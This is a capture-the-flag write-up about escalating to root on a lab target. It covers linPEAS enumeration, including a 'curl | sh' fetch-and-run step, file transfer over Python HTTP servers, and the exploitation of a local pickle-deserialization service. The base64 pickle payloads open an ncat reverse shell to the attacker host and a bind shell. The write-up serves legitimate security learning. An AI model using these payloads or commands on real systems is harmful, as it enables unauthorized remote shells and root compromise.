# 9c550d_privilege_escalation_1

In the last f9038f challenge, we got the telnet access.

run [linpease](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) enumeration to get information about the system
```
# kali machine
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8000

# target machine, 10.0.3.133
wget http://192.168.0.7:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh > linpeas_result.txt

# there is another way to execute linpeas.sh
python3 -m http.server 8000 # kali machine
curl http://192.168.0.7:8000/linpeas.sh | sh # target machine


# get the linpeas_result.txt file
# target machine
python3 -m http.server 8000

# kali machine
wget http://10.0.3.133:8000/linpeas_result.txt
```


After analyzing the linpeas_result.txt, we find that the web service running in `127.0.0.1:8000` is suspicious. When I tried to access it `curl 127.0.0.1:8000`, I got it is a `Python server that deserializes python pickles.`

## the first solution
So I tried to search it online, there is a write up about it: https://ctftime.org/writeup/36628.
```
python3 pe.py


# kali machine
nc -lvp 4444

find / -type f -name "flag{9c*" 2>/dev/null
/root/flag{9c550d7657a45d03047c432d0a71d95ac041aa04dc6d93}.jpg


# target machine 10.0.3.133
curl http://127.0.0.1:8000/deserialize?data=gASVPQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJuY2F0IDE5Mi4xNjguMC43IDQ0NDQgLWUgL2Jpbi9iYXNolIWUUpQu
gASVPQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCJuY2F0IDE5Mi4xNjguMC43IDQ0NDQgLWUgL2Jpbi9iYXNolIWUUpQu

```

## the second solution
```

python3 pe_from_course.py


# target machine
curl http://127.0.0.1:8000/deserialize?data=gASVOgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB9uY2F0IC1sdnZ2cCA0NDQ0IC1lIC9iaW4vYmFzaCAmlIWUUpQu

nc localhost 4444

```
